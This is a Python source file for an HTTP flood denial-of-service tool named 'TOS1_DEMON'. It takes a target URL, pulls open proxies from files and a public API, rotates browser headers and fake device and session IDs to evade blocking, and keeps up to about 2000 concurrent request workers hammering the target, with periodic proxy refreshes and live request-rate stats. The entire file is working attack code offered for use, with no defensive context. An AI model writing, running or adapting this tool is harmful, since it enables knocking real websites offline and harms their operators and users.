import asyncio
import aiohttp
import time
import random
import os
import sys
from datetime import datetime, timedelta
import psutil
import threading

class TOS1_DEMON:
    def __init__(self, target_url):
        self.target_url = target_url
        self.total_requests = 0
        self.session_id = "S023"
        self.demon_id = "TØS-RR"
        
        # PROXY SYSTEM
        self.proxies = []
        self.current_proxy_index = 0
        self.proxy_files = ['h1.txt', 'h2.txt']
        self.proxy_api = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all"
        
        # HEADER ROTATION
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1'
        ]
        
        self.device_ids = [
            '550e8400-e29b-41d4-a716-446655440000',
            '6ba7b810-9dad-11d1-80b4-00c04fd430c8',
            '1b9d6bcd-bbfd-4b2d-9b5d-ab8dfbbd4bed',
            '9f6c5d8a-4b3c-4a2d-8e1f-3c7a6b9d0e2f'
        ]
        
        self.session_ids = [
            'session_' + ''.join(random.choices('abcdef0123456789', k=32)) for _ in range(10)
        ]
        
        # PERFORMANCE CONTROL
        self.max_cpu = 0.89
        self.running = True
        self.maintenance_mode = False
        self.last_maintenance = time.time()
        self.maintenance_interval = 900  # 15 minutes
        
        # STATS
        self.start_time = time.time()
        self.peak_rps = 0
        self.current_rps = 0
        self.requests_since_last = 0
        self.last_rps_calc = time.time()
        
        # ASYNC
        self.session = None
        self.semaphore = asyncio.Semaphore(1000)  # Max concurrent requests
        
    async def load_proxies(self):
        """Load proxies from files and API"""
        all_proxies = []
        
        # Load from files
        for file in self.proxy_files:
            try:
                if os.path.exists(file):
                    with open(file, 'r') as f:
                        proxies = [line.strip() for line in f if line.strip()]
                        all_proxies.extend(proxies)
                        print(f"[+] Loaded {len(proxies)} proxies from {file}")
            except Exception as e:
                print(f"[-] Error loading {file}: {e}")
        
        # Load from API
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(self.proxy_api, timeout=10) as resp:
                    if resp.status == 200:
                        text = await resp.text()
                        api_proxies = [p.strip() for p in text.split('\n') if p.strip()]
                        all_proxies.extend(api_proxies)
                        print(f"[+] Loaded {len(api_proxies)} proxies from API")
        except Exception as e:
            print(f"[-] Error loading API proxies: {e}")
        
        # Remove duplicates
        self.proxies = list(set(all_proxies))
        print(f"[+] Total unique proxies: {len(self.proxies)}")
        
        if not self.proxies:
            print("[!] No proxies loaded, using direct connection")
            self.proxies = [None]
    
    def get_next_proxy(self):
        """Get next proxy in rotation"""
        if not self.proxies:
            return None
        
        self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxies)
        proxy = self.proxies[self.current_proxy_index]
        
        if proxy:
            return f"http://{proxy}"
        return None
    
    def generate_headers(self):
        """Generate realistic headers with rotation"""
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
        }
        
        # Add device/session IDs
        if random.random() > 0.5:
            headers['X-Device-ID'] = random.choice(self.device_ids)
        if random.random() > 0.5:
            headers['X-Session-ID'] = random.choice(self.session_ids)
        
        return headers
    
    def check_cpu_usage(self):
        """Monitor and throttle CPU usage"""
        cpu_percent = psutil.cpu_percent(interval=0.1)
        
        if cpu_percent > self.max_cpu * 100:
            # Reduce concurrency
            new_limit = max(100, self.semaphore._value - 50)
            self.semaphore = asyncio.Semaphore(new_limit)
        elif cpu_percent < self.max_cpu * 100 * 0.8:
            # Increase concurrency
            new_limit = min(2000, self.semaphore._value + 50)
            self.semaphore = asyncio.Semaphore(new_limit)
        
        return cpu_percent
    
    async def send_request(self):
        """Send single HTTP request"""
        proxy = self.get_next_proxy()
        headers = self.generate_headers()
        
        connector = aiohttp.TCPConnector(ssl=False, limit=0)
        
        try:
            timeout = aiohttp.ClientTimeout(total=10)
            
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                if proxy:
                    async with session.get(self.target_url, headers=headers, proxy=proxy) as response:
                        await response.read()
                else:
                    async with session.get(self.target_url, headers=headers) as response:
                        await response.read()
                        
                return True
                
        except Exception as e:
            return False
        finally:
            self.total_requests += 1
            self.requests_since_last += 1
    
    async def attack_worker(self):
        """Worker coroutine for sending requests"""
        while self.running and not self.maintenance_mode:
            async with self.semaphore:
                await self.send_request()
                
                # Small delay to prevent complete blocking
                await asyncio.sleep(0)
    
    def calculate_rps(self):
        """Calculate current RPS"""
        now = time.time()
        time_diff = now - self.last_rps_calc
        
        if time_diff >= 0.001:  # Every millisecond
            self.current_rps = self.requests_since_last / time_diff
            self.peak_rps = max(self.peak_rps, self.current_rps)
            self.requests_since_last = 0
            self.last_rps_calc = now
    
    def update_display(self):
        """Update the single-line display"""
        self.calculate_rps()
        
        # Clear and overwrite
        sys.stdout.write(f'\rTØS-TRS — {self.total_requests} | {{{self.session_id}, {self.demon_id}}}')
        sys.stdout.flush()
    
    async def maintenance(self):
        """Perform maintenance every 15 minutes"""
        print(f"\n[!] MAINTENANCE MODE - CLEANING [!]")
        self.maintenance_mode = True
        
        # Wait for active requests to finish
        await asyncio.sleep(2)
        
        # Clear session
        if self.session:
            await self.session.close()
            self.session = None
        
        # Refresh proxies
        await self.load_proxies()
        
        # Refresh IDs
        self.session_ids = [
            'session_' + ''.join(random.choices('abcdef0123456789', k=32)) for _ in range(10)
        ]
        
        # Clear system caches
        if os.name == 'posix':
            os.system('sync && echo 3 > /proc/sys/vm/drop_caches 2>/dev/null || true')
        
        print(f"[+] Maintenance complete - Resuming attack")
        self.maintenance_mode = False
        self.last_maintenance = time.time()
    
    async def monitor_maintenance(self):
        """Check if maintenance is needed"""
        while self.running:
            current_time = time.time()
            
            if current_time - self.last_maintenance >= self.maintenance_interval:
                await self.maintenance()
            
            await asyncio.sleep(1)
    
    async def monitor_display(self):
        """Update display every millisecond"""
        while self.running:
            self.update_display()
            self.check_cpu_usage()
            await asyncio.sleep(0.001)  # 1ms
    
    async def start_attack(self, worker_count=1000):
        """Start the attack"""
        # Create worker tasks
        workers = [self.attack_worker() for _ in range(worker_count)]
        
        # Start all tasks
        await asyncio.gather(
            *workers,
            self.monitor_maintenance(),
            self.monitor_display(),
            return_exceptions=True
        )
    
    def start(self):
        """Start the demon"""
        # Initial display
        print("𝖳Ø𝖲-1 | 𝖲023")
        time.sleep(2)
        os.system('clear' if os.name == 'posix' else 'cls')
        
        # Load proxies
        loop = asyncio.get_event_loop()
        loop.run_until_complete(self.load_proxies())
        
        print(f"[+] Target: {self.target_url}")
        print(f"[+] Proxies: {len(self.proxies)}")
        print(f"[+] CPU Limit: {self.max_cpu * 100}%")
        print(f"[+] Maintenance: Every 15 minutes")
        print("=" * 50)
        
        # Start attack
        try:
            loop.run_until_complete(self.start_attack())
        except KeyboardInterrupt:
            print("\n\n[!] Demon stopped by user")
        finally:
            self.running = False
            
            # Final stats
            runtime = time.time() - self.start_time
            avg_rps = self.total_requests / runtime
            
            print(f"\n=== TØS-1 FINAL STATS ===")
            print(f"Total Requests: {self.total_requests:,}")
            print(f"Peak RPS: {self.peak_rps:,.1f}")
            print(f"Average RPS: {avg_rps:,.1f}")
            print(f"Runtime: {runtime:.1f}s")
            print("=" * 30)

# Main execution
if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python tos1.py https://target.com")
        sys.exit(1)
    
    target = sys.argv[1]
    
    # Increase limits for performance
    import resource
    try:
        resource.setrlimit(resource.RLIMIT_NOFILE, (100000, 100000))
    except:
        pass
    
    demon = TOS1_DEMON(target)
    demon.start()
